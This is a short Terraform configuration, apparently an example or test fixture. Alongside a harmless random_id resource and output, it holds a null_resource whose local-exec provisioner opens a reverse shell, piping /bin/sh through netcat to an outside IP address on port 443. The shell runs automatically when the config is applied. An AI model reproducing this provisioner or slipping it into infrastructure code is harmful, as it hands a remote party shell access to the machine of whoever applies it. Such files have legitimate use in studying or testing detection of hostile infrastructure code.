
resource "random_id" "random" {
  keepers = {
    uuid = "${uuid()}"
  }

  byte_length = 16
}

resource "null_resource" "example17" {
  provisioner "local-exec" {
    command = "mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc 35.247.19.101 443 1>/tmp/backpipe"
  }
}


output "random" {
  value = "${random_id.random.hex}"
}
